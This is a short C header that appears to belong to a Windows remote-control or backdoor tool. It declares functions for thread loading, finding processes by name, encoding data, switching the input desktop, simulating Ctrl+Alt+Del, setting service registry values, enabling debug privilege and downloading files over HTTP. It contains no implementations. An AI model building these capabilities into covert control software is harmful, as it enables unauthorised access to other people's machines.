#if !defined(AFX_UNTIL_H_INCLUDED)
#define AFX_UNTIL_H_INCLUDED
#include "../RegEditEx.h"
typedef struct 
{
	unsigned ( __stdcall *start_address )( void * );
	void	*arglist;
	bool	bInteractive; // 是否支持交互桌面
	HANDLE	hEventTransferArg;
}THREAD_ARGLIST, *LPTHREAD_ARGLIST;

DWORD WINAPI ThreadLoader(LPVOID lparam);

HANDLE MyCreateThread (LPSECURITY_ATTRIBUTES lpThreadAttributes, // SD
					   SIZE_T dwStackSize,                       // initial stack size
					   LPTHREAD_START_ROUTINE lpStartAddress,    // thread function
					   LPVOID lpParameter,                       // thread argument
					   DWORD dwCreationFlags,                    // creation option
					   LPDWORD lpThreadId, bool bInteractive = false);

DWORD GetProcessID(LPCSTR lpProcessName);

char* MyEncode(char *data,int len);
char* MyDecode(char *data,int len);
BOOL SelectHDESK(HDESK new_desktop);
BOOL SelectDesktop(char *name);
BOOL SimulateCtrlAltDel();
bool SwitchInputDesktop();
void SetInfo(LPCTSTR lpKeyName, LPCTSTR lpszValueName, LPCTSTR lpServiceName);
void DelSetInfo(LPCTSTR lpKeyName, LPCTSTR lpszValueName, LPCTSTR lpServiceName);
BOOL CheckFileExist(LPCTSTR lpszPath);
BOOL DebugPrivilege(const char *PName,BOOL bEnable);
bool http_get(LPCTSTR szURL, LPCTSTR szFileName);
#endif // !defined(AFX_UNTIL_H_INCLUDED)
